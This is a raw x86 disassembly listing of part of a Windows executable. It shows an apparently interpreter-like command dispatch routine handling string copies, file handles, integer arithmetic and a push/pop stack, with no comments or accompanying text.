  4016d6:	0f 84 7e 12 00 00    	je     0x40295a
  4016dc:	56                   	push   %esi
  4016dd:	e8 3a 52 00 00       	call   0x40691c
  4016e2:	85 c0                	test   %eax,%eax
  4016e4:	0f 84 70 12 00 00    	je     0x40295a
  4016ea:	57                   	push   %edi
  4016eb:	56                   	push   %esi
  4016ec:	e8 8e 4c 00 00       	call   0x40637f
  4016f1:	6a e4                	push   $0xffffffe4
  4016f3:	e9 25 0c 00 00       	jmp    0x40231d
  4016f8:	53                   	push   %ebx
  4016f9:	e8 d4 16 00 00       	call   0x402dd2
  4016fe:	8b 7d f4             	mov    -0xc(%ebp),%edi
  401701:	8b f0                	mov    %eax,%esi
  401703:	8d 45 08             	lea    0x8(%ebp),%eax
  401706:	50                   	push   %eax
  401707:	57                   	push   %edi
  401708:	68 00 04 00 00       	push   $0x400
  40170d:	56                   	push   %esi
  40170e:	ff 15 e8 80 40 00    	call   *0x4080e8
  401714:	85 c0                	test   %eax,%eax
  401716:	74 24                	je     0x40173c
  401718:	8b 45 08             	mov    0x8(%ebp),%eax
  40171b:	3b c6                	cmp    %esi,%eax
  40171d:	76 27                	jbe    0x401746
  40171f:	66 39 18             	cmp    %bx,(%eax)
  401722:	74 22                	je     0x401746
  401724:	56                   	push   %esi
  401725:	e8 f2 51 00 00       	call   0x40691c
  40172a:	3b c3                	cmp    %ebx,%eax
  40172c:	74 0e                	je     0x40173c
  40172e:	83 c0 2c             	add    $0x2c,%eax
  401731:	50                   	push   %eax
  401732:	ff 75 08             	push   0x8(%ebp)
  401735:	e8 85 4e 00 00       	call   0x4065bf
  40173a:	eb 0a                	jmp    0x401746
  40173c:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401743:	66 89 1f             	mov    %bx,(%edi)
  401746:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  401749:	0f 85 07 15 00 00    	jne    0x402c56
  40174f:	68 00 04 00 00       	push   $0x400
  401754:	57                   	push   %edi
  401755:	57                   	push   %edi
  401756:	ff 15 ec 80 40 00    	call   *0x4080ec
  40175c:	e9 f5 14 00 00       	jmp    0x402c56
  401761:	6a ff                	push   $0xffffffff
  401763:	e8 6a 16 00 00       	call   0x402dd2
  401768:	8d 4d 08             	lea    0x8(%ebp),%ecx
  40176b:	51                   	push   %ecx
  40176c:	57                   	push   %edi
  40176d:	68 00 04 00 00       	push   $0x400
  401772:	53                   	push   %ebx
  401773:	50                   	push   %eax
  401774:	53                   	push   %ebx
  401775:	ff 15 f0 80 40 00    	call   *0x4080f0
  40177b:	85 c0                	test   %eax,%eax
  40177d:	0f 85 d3 14 00 00    	jne    0x402c56
  401783:	e9 a0 11 00 00       	jmp    0x402928
  401788:	6a ef                	push   $0xffffffef
  40178a:	e8 43 16 00 00       	call   0x402dd2
  40178f:	50                   	push   %eax
  401790:	57                   	push   %edi
  401791:	e8 48 49 00 00       	call   0x4060de
  401796:	e9 3e fe ff ff       	jmp    0x4015d9
  40179b:	6a 31                	push   $0x31
  40179d:	e8 30 16 00 00       	call   0x402dd2
  4017a2:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4017a5:	8b 45 d0             	mov    -0x30(%ebp),%eax
  4017a8:	ff 75 f8             	push   -0x8(%ebp)
  4017ab:	83 e0 07             	and    $0x7,%eax
  4017ae:	89 45 08             	mov    %eax,0x8(%ebp)
  4017b1:	e8 4f 47 00 00       	call   0x405f05
  4017b6:	ff 75 f8             	push   -0x8(%ebp)
  4017b9:	bf f0 a5 40 00       	mov    $0x40a5f0,%edi
  4017be:	85 c0                	test   %eax,%eax
  4017c0:	74 08                	je     0x4017ca
  4017c2:	57                   	push   %edi
  4017c3:	e8 f7 4d 00 00       	call   0x4065bf
  4017c8:	eb 17                	jmp    0x4017e1
  4017ca:	68 00 00 44 00       	push   $0x440000
  4017cf:	57                   	push   %edi
  4017d0:	e8 ea 4d 00 00       	call   0x4065bf
  4017d5:	50                   	push   %eax
  4017d6:	e8 b3 46 00 00       	call   0x405e8e
  4017db:	50                   	push   %eax
  4017dc:	e8 fa 4d 00 00       	call   0x4065db
  4017e1:	57                   	push   %edi
  4017e2:	e8 86 50 00 00       	call   0x40686d
  4017e7:	83 7d 08 03          	cmpl   $0x3,0x8(%ebp)
  4017eb:	7c 31                	jl     0x40181e
  4017ed:	57                   	push   %edi
  4017ee:	e8 29 51 00 00       	call   0x40691c
  4017f3:	33 c9                	xor    %ecx,%ecx
  4017f5:	3b c3                	cmp    %ebx,%eax
  4017f7:	74 10                	je     0x401809
  4017f9:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  4017fc:	83 c0 14             	add    $0x14,%eax
  4017ff:	51                   	push   %ecx
  401800:	50                   	push   %eax
  401801:	ff 15 f4 80 40 00    	call   *0x4080f4
  401807:	8b c8                	mov    %eax,%ecx
  401809:	8b 45 08             	mov    0x8(%ebp),%eax
  40180c:	83 c0 fd             	add    $0xfffffffd,%eax
  40180f:	0d 00 00 00 80       	or     $0x80000000,%eax
  401814:	23 c1                	and    %ecx,%eax
  401816:	f7 d8                	neg    %eax
  401818:	1b c0                	sbb    %eax,%eax
  40181a:	40                   	inc    %eax
  40181b:	89 45 08             	mov    %eax,0x8(%ebp)
  40181e:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  401821:	75 06                	jne    0x401829
  401823:	57                   	push   %edi
  401824:	e8 61 48 00 00       	call   0x40608a
  401829:	33 c0                	xor    %eax,%eax
  40182b:	83 7d 08 01          	cmpl   $0x1,0x8(%ebp)
  40182f:	0f 95 c0             	setne  %al
  401832:	40                   	inc    %eax
  401833:	50                   	push   %eax
  401834:	68 00 00 00 40       	push   $0x40000000
  401839:	57                   	push   %edi
  40183a:	e8 70 48 00 00       	call   0x4060af
  40183f:	83 f8 ff             	cmp    $0xffffffff,%eax
  401842:	89 45 c8             	mov    %eax,-0x38(%ebp)
  401845:	75 72                	jne    0x4018b9
  401847:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  40184a:	75 4f                	jne    0x40189b
  40184c:	56                   	push   %esi
  40184d:	68 f0 b5 40 00       	push   $0x40b5f0
  401852:	e8 68 4d 00 00       	call   0x4065bf
  401857:	57                   	push   %edi
  401858:	56                   	push   %esi
  401859:	e8 61 4d 00 00       	call   0x4065bf
  40185e:	ff 75 e4             	push   -0x1c(%ebp)
  401861:	68 f0 ad 40 00       	push   $0x40adf0
  401866:	e8 91 4d 00 00       	call   0x4065fc
  40186b:	68 f0 b5 40 00       	push   $0x40b5f0
  401870:	56                   	push   %esi
  401871:	e8 49 4d 00 00       	call   0x4065bf
  401876:	8b 45 d0             	mov    -0x30(%ebp),%eax
  401879:	c1 f8 03             	sar    $0x3,%eax
  40187c:	50                   	push   %eax
  40187d:	68 f0 ad 40 00       	push   $0x40adf0
  401882:	e8 98 43 00 00       	call   0x405c1f
  401887:	83 e8 04             	sub    $0x4,%eax
  40188a:	0f 84 57 ff ff ff    	je     0x4017e7
  401890:	48                   	dec    %eax
  401891:	74 1b                	je     0x4018ae
  401893:	57                   	push   %edi
  401894:	6a fa                	push   $0xfffffffa
  401896:	e9 f8 fb ff ff       	jmp    0x401493
  40189b:	ff 75 f8             	push   -0x8(%ebp)
  40189e:	6a e2                	push   $0xffffffe2
  4018a0:	e8 9f 3d 00 00       	call   0x405644
  4018a5:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
  4018a9:	e9 2d fd ff ff       	jmp    0x4015db
  4018ae:	ff 05 88 47 43 00    	incl   0x434788
  4018b4:	e9 a6 13 00 00       	jmp    0x402c5f
  4018b9:	ff 75 f8             	push   -0x8(%ebp)
  4018bc:	6a ea                	push   $0xffffffea
  4018be:	e8 81 3d 00 00       	call   0x405644
  4018c3:	ff 05 b4 47 43 00    	incl   0x4347b4
  4018c9:	53                   	push   %ebx
  4018ca:	53                   	push   %ebx
  4018cb:	ff 75 c8             	push   -0x38(%ebp)
  4018ce:	ff 75 d8             	push   -0x28(%ebp)
  4018d1:	e8 3e 1a 00 00       	call   0x403314
  4018d6:	ff 0d b4 47 43 00    	decl   0x4347b4
  4018dc:	83 7d dc ff          	cmpl   $0xffffffff,-0x24(%ebp)
  4018e0:	8b f0                	mov    %eax,%esi
  4018e2:	75 06                	jne    0x4018ea
  4018e4:	83 7d e0 ff          	cmpl   $0xffffffff,-0x20(%ebp)
  4018e8:	74 12                	je     0x4018fc
  4018ea:	8d 45 dc             	lea    -0x24(%ebp),%eax
  4018ed:	50                   	push   %eax
  4018ee:	8d 45 dc             	lea    -0x24(%ebp),%eax
  4018f1:	53                   	push   %ebx
  4018f2:	50                   	push   %eax
  4018f3:	ff 75 c8             	push   -0x38(%ebp)
  4018f6:	ff 15 f8 80 40 00    	call   *0x4080f8
  4018fc:	ff 75 c8             	push   -0x38(%ebp)
  4018ff:	ff 15 fc 80 40 00    	call   *0x4080fc
  401905:	3b f3                	cmp    %ebx,%esi
  401907:	0f 8d 49 13 00 00    	jge    0x402c56
  40190d:	83 fe fe             	cmp    $0xfffffffe,%esi
  401910:	75 13                	jne    0x401925
  401912:	6a e9                	push   $0xffffffe9
  401914:	57                   	push   %edi
  401915:	e8 e2 4c 00 00       	call   0x4065fc
  40191a:	ff 75 f8             	push   -0x8(%ebp)
  40191d:	57                   	push   %edi
  40191e:	e8 b8 4c 00 00       	call   0x4065db
  401923:	eb 08                	jmp    0x40192d
  401925:	6a ee                	push   $0xffffffee
  401927:	57                   	push   %edi
  401928:	e8 cf 4c 00 00       	call   0x4065fc
  40192d:	68 10 00 20 00       	push   $0x200010
  401932:	57                   	push   %edi
  401933:	e9 8c 0a 00 00       	jmp    0x4023c4
  401938:	53                   	push   %ebx
  401939:	eb 34                	jmp    0x40196f
  40193b:	6a 31                	push   $0x31
  40193d:	e8 90 14 00 00       	call   0x402dd2
  401942:	ff 75 d0             	push   -0x30(%ebp)
  401945:	50                   	push   %eax
  401946:	e8 d4 42 00 00       	call   0x405c1f
  40194b:	3b c3                	cmp    %ebx,%eax
  40194d:	0f 84 07 10 00 00    	je     0x40295a
  401953:	3b 45 d8             	cmp    -0x28(%ebp),%eax
  401956:	0f 84 6c 01 00 00    	je     0x401ac8
  40195c:	3b 45 e0             	cmp    -0x20(%ebp),%eax
  40195f:	0f 85 f1 12 00 00    	jne    0x402c56
  401965:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  401968:	e9 f4 12 00 00       	jmp    0x402c61
  40196d:	6a f0                	push   $0xfffffff0
  40196f:	e8 5e 14 00 00       	call   0x402dd2
  401974:	ff 75 d4             	push   -0x2c(%ebp)
  401977:	50                   	push   %eax
  401978:	e8 4e 43 00 00       	call   0x405ccb
  40197d:	e9 d4 12 00 00       	jmp    0x402c56
  401982:	6a 01                	push   $0x1
  401984:	e8 49 14 00 00       	call   0x402dd2
  401989:	50                   	push   %eax
  40198a:	e8 46 4c 00 00       	call   0x4065d5
  40198f:	e9 d0 0c 00 00       	jmp    0x402664
  401994:	6a 02                	push   $0x2
  401996:	e8 15 14 00 00       	call   0x402db0
  40199b:	6a 03                	push   $0x3
  40199d:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4019a0:	89 55 f0             	mov    %edx,-0x10(%ebp)
  4019a3:	e8 08 14 00 00       	call   0x402db0
  4019a8:	59                   	pop    %ecx
  4019a9:	8b f0                	mov    %eax,%esi
  4019ab:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4019ae:	59                   	pop    %ecx
  4019af:	6a 01                	push   $0x1
  4019b1:	89 75 c4             	mov    %esi,-0x3c(%ebp)
  4019b4:	89 55 c8             	mov    %edx,-0x38(%ebp)
  4019b7:	89 45 08             	mov    %eax,0x8(%ebp)
  4019ba:	e8 13 14 00 00       	call   0x402dd2
  4019bf:	50                   	push   %eax
  4019c0:	89 45 bc             	mov    %eax,-0x44(%ebp)
  4019c3:	e8 0d 4c 00 00       	call   0x4065d5
  4019c8:	39 5d f0             	cmp    %ebx,-0x10(%ebp)
  4019cb:	66 89 1f             	mov    %bx,(%edi)
  4019ce:	75 03                	jne    0x4019d3
  4019d0:	89 45 08             	mov    %eax,0x8(%ebp)
  4019d3:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  4019d6:	0f 84 7a 12 00 00    	je     0x402c56
  4019dc:	8b 4d c4             	mov    -0x3c(%ebp),%ecx
  4019df:	3b cb                	cmp    %ebx,%ecx
  4019e1:	7d 0b                	jge    0x4019ee
  4019e3:	8d 34 08             	lea    (%eax,%ecx,1),%esi
  4019e6:	3b f3                	cmp    %ebx,%esi
  4019e8:	0f 8c 68 12 00 00    	jl     0x402c56
  4019ee:	3b f0                	cmp    %eax,%esi
  4019f0:	7e 02                	jle    0x4019f4
  4019f2:	8b f0                	mov    %eax,%esi
  4019f4:	8b 45 bc             	mov    -0x44(%ebp),%eax
  4019f7:	8d 04 70             	lea    (%eax,%esi,2),%eax
  4019fa:	50                   	push   %eax
  4019fb:	57                   	push   %edi
  4019fc:	e8 be 4b 00 00       	call   0x4065bf
  401a01:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  401a04:	7d 0e                	jge    0x401a14
  401a06:	57                   	push   %edi
  401a07:	e8 c9 4b 00 00       	call   0x4065d5
  401a0c:	01 45 08             	add    %eax,0x8(%ebp)
  401a0f:	79 03                	jns    0x401a14
  401a11:	89 5d 08             	mov    %ebx,0x8(%ebp)
  401a14:	8b 45 08             	mov    0x8(%ebp),%eax
  401a17:	3d 00 04 00 00       	cmp    $0x400,%eax
  401a1c:	0f 8d 34 12 00 00    	jge    0x402c56
  401a22:	66 89 1c 47          	mov    %bx,(%edi,%eax,2)
  401a26:	e9 2b 12 00 00       	jmp    0x402c56
  401a2b:	6a 20                	push   $0x20
  401a2d:	e8 a0 13 00 00       	call   0x402dd2
  401a32:	6a 31                	push   $0x31
  401a34:	8b f0                	mov    %eax,%esi
  401a36:	e8 97 13 00 00       	call   0x402dd2
  401a3b:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  401a3e:	50                   	push   %eax
  401a3f:	56                   	push   %esi
  401a40:	75 12                	jne    0x401a54
  401a42:	ff 15 00 81 40 00    	call   *0x408100
  401a48:	85 c0                	test   %eax,%eax
  401a4a:	75 7c                	jne    0x401ac8
  401a4c:	8b 45 d8             	mov    -0x28(%ebp),%eax
  401a4f:	e9 0d 12 00 00       	jmp    0x402c61
  401a54:	ff 15 04 81 40 00    	call   *0x408104
  401a5a:	eb ec                	jmp    0x401a48
  401a5c:	33 f6                	xor    %esi,%esi
  401a5e:	46                   	inc    %esi
  401a5f:	56                   	push   %esi
  401a60:	e8 6d 13 00 00       	call   0x402dd2
  401a65:	68 00 04 00 00       	push   $0x400
  401a6a:	57                   	push   %edi
  401a6b:	50                   	push   %eax
  401a6c:	89 45 08             	mov    %eax,0x8(%ebp)
  401a6f:	ff 15 08 81 40 00    	call   *0x408108
  401a75:	85 c0                	test   %eax,%eax
  401a77:	74 13                	je     0x401a8c
  401a79:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  401a7c:	74 14                	je     0x401a92
  401a7e:	57                   	push   %edi
  401a7f:	ff 75 08             	push   0x8(%ebp)
  401a82:	ff 15 04 81 40 00    	call   *0x408104
  401a88:	85 c0                	test   %eax,%eax
  401a8a:	75 06                	jne    0x401a92
  401a8c:	89 75 fc             	mov    %esi,-0x4(%ebp)
  401a8f:	66 89 1f             	mov    %bx,(%edi)
  401a92:	66 89 9f fe 07 00 00 	mov    %bx,0x7fe(%edi)
  401a99:	e9 b8 11 00 00       	jmp    0x402c56
  401a9e:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  401aa1:	53                   	push   %ebx
  401aa2:	e8 09 13 00 00       	call   0x402db0
  401aa7:	6a 01                	push   $0x1
  401aa9:	8b f8                	mov    %eax,%edi
  401aab:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401aae:	e8 fd 12 00 00       	call   0x402db0
  401ab3:	59                   	pop    %ecx
  401ab4:	3b f3                	cmp    %ebx,%esi
  401ab6:	59                   	pop    %ecx
  401ab7:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401aba:	75 08                	jne    0x401ac4
  401abc:	3b f8                	cmp    %eax,%edi
  401abe:	7c 08                	jl     0x401ac8
  401ac0:	7e 8a                	jle    0x401a4c
  401ac2:	eb 12                	jmp    0x401ad6
  401ac4:	3b f8                	cmp    %eax,%edi
  401ac6:	73 08                	jae    0x401ad0
  401ac8:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401acb:	e9 91 11 00 00       	jmp    0x402c61
  401ad0:	0f 86 76 ff ff ff    	jbe    0x401a4c
  401ad6:	8b 45 e0             	mov    -0x20(%ebp),%eax
  401ad9:	e9 83 11 00 00       	jmp    0x402c61
  401ade:	6a 01                	push   $0x1
  401ae0:	e8 cb 12 00 00       	call   0x402db0
  401ae5:	8b f0                	mov    %eax,%esi
  401ae7:	6a 02                	push   $0x2
  401ae9:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401aec:	89 75 08             	mov    %esi,0x8(%ebp)
  401aef:	e8 bc 12 00 00       	call   0x402db0
  401af4:	59                   	pop    %ecx
  401af5:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401af8:	59                   	pop    %ecx
  401af9:	8b c8                	mov    %eax,%ecx
  401afb:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401afe:	83 f8 0d             	cmp    $0xd,%eax
  401b01:	0f 87 94 00 00 00    	ja     0x401b9b
  401b07:	ff 24 85 78 2d 40 00 	jmp    *0x402d78(,%eax,4)
  401b0e:	03 f1                	add    %ecx,%esi
  401b10:	e9 5f 03 00 00       	jmp    0x401e74
  401b15:	2b f1                	sub    %ecx,%esi
  401b17:	e9 58 03 00 00       	jmp    0x401e74
  401b1c:	0f af ce             	imul   %esi,%ecx
  401b1f:	eb 1a                	jmp    0x401b3b
  401b21:	3b cb                	cmp    %ebx,%ecx
  401b23:	74 53                	je     0x401b78
  401b25:	8b c6                	mov    %esi,%eax
  401b27:	99                   	cltd
  401b28:	f7 f9                	idiv   %ecx
  401b2a:	8b f0                	mov    %eax,%esi
  401b2c:	e9 43 03 00 00       	jmp    0x401e74
  401b31:	0b ce                	or     %esi,%ecx
  401b33:	eb 06                	jmp    0x401b3b
  401b35:	23 ce                	and    %esi,%ecx
  401b37:	eb 02                	jmp    0x401b3b
  401b39:	33 ce                	xor    %esi,%ecx
  401b3b:	8b f1                	mov    %ecx,%esi
  401b3d:	e9 32 03 00 00       	jmp    0x401e74
  401b42:	33 c0                	xor    %eax,%eax
  401b44:	3b f3                	cmp    %ebx,%esi
  401b46:	0f 94 c0             	sete   %al
  401b49:	eb df                	jmp    0x401b2a
  401b4b:	3b f3                	cmp    %ebx,%esi
  401b4d:	75 11                	jne    0x401b60
  401b4f:	eb 0b                	jmp    0x401b5c
  401b51:	33 f6                	xor    %esi,%esi
  401b53:	e9 1c 03 00 00       	jmp    0x401e74
  401b58:	3b f3                	cmp    %ebx,%esi
  401b5a:	74 f5                	je     0x401b51
  401b5c:	3b cb                	cmp    %ebx,%ecx
  401b5e:	74 f1                	je     0x401b51
  401b60:	33 f6                	xor    %esi,%esi
  401b62:	46                   	inc    %esi
  401b63:	e9 0c 03 00 00       	jmp    0x401e74
  401b68:	3b cb                	cmp    %ebx,%ecx
  401b6a:	74 0c                	je     0x401b78
  401b6c:	8b c6                	mov    %esi,%eax
  401b6e:	99                   	cltd
  401b6f:	f7 f9                	idiv   %ecx
  401b71:	8b f2                	mov    %edx,%esi
  401b73:	e9 fc 02 00 00       	jmp    0x401e74
  401b78:	33 f6                	xor    %esi,%esi
  401b7a:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401b81:	e9 ee 02 00 00       	jmp    0x401e74
  401b86:	d3 e6                	shl    %cl,%esi
  401b88:	e9 e7 02 00 00       	jmp    0x401e74
  401b8d:	d3 fe                	sar    %cl,%esi
  401b8f:	e9 e0 02 00 00       	jmp    0x401e74
  401b94:	d3 ee                	shr    %cl,%esi
  401b96:	e9 d9 02 00 00       	jmp    0x401e74
  401b9b:	8b 75 08             	mov    0x8(%ebp),%esi
  401b9e:	e9 d1 02 00 00       	jmp    0x401e74
  401ba3:	6a 01                	push   $0x1
  401ba5:	e8 28 12 00 00       	call   0x402dd2
  401baa:	6a 02                	push   $0x2
  401bac:	8b f0                	mov    %eax,%esi
  401bae:	e8 fd 11 00 00       	call   0x402db0
  401bb3:	50                   	push   %eax
  401bb4:	56                   	push   %esi
  401bb5:	57                   	push   %edi
  401bb6:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401bb9:	ff 15 2c 82 40 00    	call   *0x40822c
  401bbf:	83 c4 10             	add    $0x10,%esp
  401bc2:	e9 8f 10 00 00       	jmp    0x402c56
  401bc7:	8b 45 d8             	mov    -0x28(%ebp),%eax
  401bca:	8b 35 50 ce 40 00    	mov    0x40ce50,%esi
  401bd0:	3b c3                	cmp    %ebx,%eax
  401bd2:	74 44                	je     0x401c18
  401bd4:	48                   	dec    %eax
  401bd5:	3b f3                	cmp    %ebx,%esi
  401bd7:	0f 84 d9 07 00 00    	je     0x4023b6
  401bdd:	8b 36                	mov    (%esi),%esi
  401bdf:	3b c3                	cmp    %ebx,%eax
  401be1:	75 f1                	jne    0x401bd4
  401be3:	3b f3                	cmp    %ebx,%esi
  401be5:	0f 84 cb 07 00 00    	je     0x4023b6
  401beb:	83 c6 04             	add    $0x4,%esi
  401bee:	bf f0 a5 40 00       	mov    $0x40a5f0,%edi
  401bf3:	56                   	push   %esi
  401bf4:	57                   	push   %edi
  401bf5:	e8 c5 49 00 00       	call   0x4065bf
  401bfa:	a1 50 ce 40 00       	mov    0x40ce50,%eax
  401bff:	83 c0 04             	add    $0x4,%eax
  401c02:	50                   	push   %eax
  401c03:	56                   	push   %esi
  401c04:	e8 b6 49 00 00       	call   0x4065bf
  401c09:	a1 50 ce 40 00       	mov    0x40ce50,%eax
  401c0e:	57                   	push   %edi
  401c0f:	83 c0 04             	add    $0x4,%eax
  401c12:	50                   	push   %eax
  401c13:	e9 a8 0e 00 00       	jmp    0x402ac0
  401c18:	39 5d d4             	cmp    %ebx,-0x2c(%ebp)
  401c1b:	74 25                	je     0x401c42
  401c1d:	3b f3                	cmp    %ebx,%esi
  401c1f:	0f 84 35 0d 00 00    	je     0x40295a
  401c25:	8d 46 04             	lea    0x4(%esi),%eax
  401c28:	50                   	push   %eax
  401c29:	57                   	push   %edi
  401c2a:	e8 90 49 00 00       	call   0x4065bf
  401c2f:	8b 06                	mov    (%esi),%eax
  401c31:	56                   	push   %esi
  401c32:	a3 50 ce 40 00       	mov    %eax,0x40ce50
  401c37:	ff 15 0c 81 40 00    	call   *0x40810c
  401c3d:	e9 14 10 00 00       	jmp    0x402c56
  401c42:	68 04 08 00 00       	push   $0x804
  401c47:	6a 40                	push   $0x40
  401c49:	ff 15 10 81 40 00    	call   *0x408110
  401c4f:	ff 75 d0             	push   -0x30(%ebp)
  401c52:	8b f0                	mov    %eax,%esi
  401c54:	8d 46 04             	lea    0x4(%esi),%eax
  401c57:	50                   	push   %eax
  401c58:	e8 9f 49 00 00       	call   0x4065fc
  401c5d:	a1 50 ce 40 00       	mov    0x40ce50,%eax
  401c62:	89 06                	mov    %eax,(%esi)
  401c64:	89 35 50 ce 40 00    	mov    %esi,0x40ce50
  401c6a:	e9 e7 0f 00 00       	jmp    0x402c56
  401c6f:	6a 03                	push   $0x3
  401c71:	e8 3a 11 00 00       	call   0x402db0
  401c76:	6a 04                	push   $0x4
  401c78:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401c7b:	89 45 e8             	mov    %eax,-0x18(%ebp)
  401c7e:	e8 2d 11 00 00       	call   0x402db0
  401c83:	f6 45 e4 01          	testb  $0x1,-0x1c(%ebp)
  401c87:	59                   	pop    %ecx
  401c88:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401c8b:	59                   	pop    %ecx
  401c8c:	89 45 08             	mov    %eax,0x8(%ebp)
  401c8f:	74 0a                	je     0x401c9b
  401c91:	6a 33                	push   $0x33
  401c93:	e8 3a 11 00 00       	call   0x402dd2
  401c98:	89 45 e8             	mov    %eax,-0x18(%ebp)
  401c9b:	f6 45 e4 02          	testb  $0x2,-0x1c(%ebp)
  401c9f:	74 0a                	je     0x401cab
  401ca1:	6a 44                	push   $0x44
  401ca3:	e8 2a 11 00 00       	call   0x402dd2
  401ca8:	89 45 08             	mov    %eax,0x8(%ebp)
  401cab:	83 7d cc 21          	cmpl   $0x21,-0x34(%ebp)
  401caf:	6a 01                	push   $0x1
  401cb1:	75 4c                	jne    0x401cff
  401cb3:	e8 f8 10 00 00       	call   0x402db0
  401cb8:	6a 02                	push   $0x2
  401cba:	8b f0                	mov    %eax,%esi
  401cbc:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401cbf:	e8 ec 10 00 00       	call   0x402db0
  401cc4:	59                   	pop    %ecx
  401cc5:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401cc8:	59                   	pop    %ecx
  401cc9:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  401ccc:	c1 f9 02             	sar    $0x2,%ecx
  401ccf:	74 1e                	je     0x401cef
  401cd1:	8d 55 c8             	lea    -0x38(%ebp),%edx
  401cd4:	52                   	push   %edx
  401cd5:	51                   	push   %ecx
  401cd6:	53                   	push   %ebx
  401cd7:	ff 75 08             	push   0x8(%ebp)
  401cda:	ff 75 e8             	push   -0x18(%ebp)
  401cdd:	50                   	push   %eax
  401cde:	56                   	push   %esi
  401cdf:	ff 15 30 82 40 00    	call   *0x408230
  401ce5:	f7 d8                	neg    %eax
  401ce7:	1b c0                	sbb    %eax,%eax
  401ce9:	40                   	inc    %eax
  401cea:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401ced:	eb 43                	jmp    0x401d32
  401cef:	ff 75 08             	push   0x8(%ebp)
  401cf2:	ff 75 e8             	push   -0x18(%ebp)
  401cf5:	50                   	push   %eax
  401cf6:	56                   	push   %esi
  401cf7:	ff 15 58 82 40 00    	call   *0x408258
  401cfd:	eb 30                	jmp    0x401d2f
  401cff:	e8 ce 10 00 00       	call   0x402dd2
  401d04:	6a 12                	push   $0x12
  401d06:	8b f0                	mov    %eax,%esi
  401d08:	e8 c5 10 00 00       	call   0x402dd2
  401d0d:	66 8b 08             	mov    (%eax),%cx
  401d10:	66 f7 d9             	neg    %cx
  401d13:	1b c9                	sbb    %ecx,%ecx
  401d15:	23 c8                	and    %eax,%ecx
  401d17:	66 8b 06             	mov    (%esi),%ax
  401d1a:	66 f7 d8             	neg    %ax
  401d1d:	1b c0                	sbb    %eax,%eax
  401d1f:	51                   	push   %ecx
  401d20:	23 c6                	and    %esi,%eax
  401d22:	50                   	push   %eax
  401d23:	ff 75 08             	push   0x8(%ebp)
  401d26:	ff 75 e8             	push   -0x18(%ebp)
  401d29:	ff 15 34 82 40 00    	call   *0x408234
  401d2f:	89 45 c8             	mov    %eax,-0x38(%ebp)
  401d32:	39 5d d0             	cmp    %ebx,-0x30(%ebp)
  401d35:	0f 8c 1b 0f 00 00    	jl     0x402c56
  401d3b:	ff 75 c8             	push   -0x38(%ebp)
  401d3e:	e9 4f f8 ff ff       	jmp    0x401592
  401d43:	53                   	push   %ebx
  401d44:	e8 67 10 00 00       	call   0x402db0
  401d49:	59                   	pop    %ecx
  401d4a:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401d4d:	50                   	push   %eax
  401d4e:	ff 15 38 82 40 00    	call   *0x408238
  401d54:	85 c0                	test   %eax,%eax
  401d56:	0f 84 f0 fc ff ff    	je     0x401a4c
  401d5c:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  401d5f:	e9 fd 0e 00 00       	jmp    0x402c61
  401d64:	6a 02                	push   $0x2
  401d66:	e8 45 10 00 00       	call   0x402db0
  401d6b:	6a 01                	push   $0x1
  401d6d:	8b f0                	mov    %eax,%esi
  401d6f:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401d72:	e8 39 10 00 00       	call   0x402db0
  401d77:	59                   	pop    %ecx
  401d78:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401d7b:	59                   	pop    %ecx
  401d7c:	56                   	push   %esi
  401d7d:	50                   	push   %eax
  401d7e:	ff 15 3c 82 40 00    	call   *0x40823c
  401d84:	e9 db 08 00 00       	jmp    0x402664
  401d89:	a1 48 47 43 00       	mov    0x434748,%eax
  401d8e:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  401d91:	53                   	push   %ebx
  401d92:	8d 34 08             	lea    (%eax,%ecx,1),%esi
  401d95:	e8 16 10 00 00       	call   0x402db0
  401d9a:	59                   	pop    %ecx
  401d9b:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401d9e:	56                   	push   %esi
  401d9f:	6a eb                	push   $0xffffffeb
  401da1:	50                   	push   %eax
  401da2:	ff 15 40 82 40 00    	call   *0x408240
  401da8:	e9 a9 0e 00 00       	jmp    0x402c56
  401dad:	f6 45 dd 01          	testb  $0x1,-0x23(%ebp)
  401db1:	74 0d                	je     0x401dc0
  401db3:	6a 02                	push   $0x2
  401db5:	e8 f6 0f 00 00       	call   0x402db0
  401dba:	59                   	pop    %ecx
  401dbb:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401dbe:	eb 0c                	jmp    0x401dcc
  401dc0:	ff 75 d8             	push   -0x28(%ebp)
  401dc3:	ff 75 f8             	push   -0x8(%ebp)
  401dc6:	ff 15 3c 82 40 00    	call   *0x40823c
  401dcc:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  401dcf:	89 45 08             	mov    %eax,0x8(%ebp)
  401dd2:	8b c1                	mov    %ecx,%eax
  401dd4:	8b f1                	mov    %ecx,%esi
